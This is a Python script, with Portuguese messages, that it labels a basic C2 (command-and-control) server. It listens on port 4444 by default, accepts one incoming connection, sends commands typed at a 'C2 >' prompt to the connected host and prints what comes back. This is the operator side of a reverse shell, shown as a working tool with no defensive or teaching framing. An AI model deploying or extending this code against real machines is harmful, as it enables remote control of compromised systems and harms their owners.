import socket
import argparse
import sys
from termcolor import colored

def start_server(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((host, port))
        sock.listen(5)
    except Exception as e:
        print(colored(f"[ERRO] Não foi possível iniciar o servidor: {e}", "red"))
        sys.exit(1)

    print(colored(f"[-] Aguardando conexões em {host}:{port}...", "green"))

    try:
        target, ip = sock.accept()
    except KeyboardInterrupt:
        print(colored("\n[!] Servidor encerrado pelo usuário.", "red"))
        sys.exit(0)

    print(colored(f"[+] Conectado com: {ip[0]}:{ip[1]}", "green"))

    while True:
        try:
            command = input(colored("C2 > ", "blue")).strip()

            if not command:
                continue

            if command.lower() in ["exit", "quit"]:
                target.send(b"exit")
                target.close()
                print(colored("[!] Conexão encerrada.", "red"))
                break

            target.send(command.encode())
            result = target.recv(4096)

            if not result:
                print(colored("[!] Cliente desconectado.", "red"))
                break

            print(colored(result.decode(errors="ignore"), "yellow"))

        except KeyboardInterrupt:
            print(colored("\n[!] Encerrando servidor.", "red"))
            target.close()
            break
        except Exception as e:
            print(colored(f"[ERRO] {e}", "red"))
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Servidor C2 básico")
    parser.add_argument("-H", "--host", default="0.0.0.0", help="Endereço IP para escutar")
    parser.add_argument("-P", "--port", type=int, default=4444, help="Porta para escutar")
    args = parser.parse_args()

    start_server(args.host, args.port)
